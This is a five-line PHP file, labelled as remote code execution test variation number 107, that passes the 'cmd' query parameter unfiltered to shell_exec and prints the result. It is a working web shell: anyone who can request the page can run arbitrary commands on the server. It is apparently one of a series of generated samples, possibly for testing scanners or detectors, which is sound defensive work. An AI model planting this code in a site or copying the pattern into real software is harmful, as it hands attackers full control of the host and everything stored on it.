<?php
// RCE test variation #107
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>